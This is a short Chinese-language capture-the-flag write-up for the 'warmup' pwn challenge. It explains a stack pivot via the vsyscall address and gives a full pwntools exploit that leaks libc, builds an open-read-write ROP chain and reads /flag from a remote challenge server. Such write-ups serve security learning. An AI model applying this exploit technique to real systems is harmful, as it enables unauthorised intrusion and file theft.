### warmup

> [附件](vn_pwn_warmup)

1. 两个buf在栈中相邻，在第一个buf中输入payload
2. 利用vsyscall地址不变的特点覆盖第二个函数的返回地址，将栈迁移到第一个buf处进行ROP
3. execve调用被禁止了，可以orw

[exp:](warmup.py)
```
from pwn import *
context.log_level='debug'


#p = process('./vn_pwn_warmup')
p = remote('node3.buuoj.cn',28930)
libc = ELF('libc-2.23.so')

p.recvuntil(' gift: ')
libc_base = int(p.recvuntil('\n',drop=True),16)-libc.sym['puts']

print hex(libc_base)
#pause()
pop_rdi = libc_base + 0x0000000000021102
pop_rsi = libc_base + 0x00000000000202e8
pop_rdx = libc_base + 0x0000000000001b92
pop_rcx_rbx = libc_base + 0x00000000000ea69a


payload =  p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(libc_base+libc.sym['__malloc_hook'])
payload += p64(pop_rdx)
payload += p64(8)
payload += p64(libc_base+libc.sym['read'])

payload += p64(pop_rdi)
payload += p64(libc_base+libc.sym['__malloc_hook'])
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(libc_base+libc.sym['open'])

payload += p64(pop_rdi)
payload += p64(3) # fd
payload += p64(pop_rsi)
payload += p64(libc_base+libc.sym['__malloc_hook'])
payload += p64(pop_rdx)
payload += p64(48)
payload += p64(libc_base+libc.sym['read'])

payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(libc_base+libc.sym['__malloc_hook'])
payload += p64(pop_rdx)
payload += p64(48)
payload += p64(libc_base+libc.sym['write'])

p.recvuntil('something: ')
p.sendline(payload)

vsysall = 0xffffffffff600000

p.recvuntil('?')
#gdb.attach(p)
p.send('A'*120+p64(vsysall))
p.send('/flag\x00')
#pause()
p.interactive()

```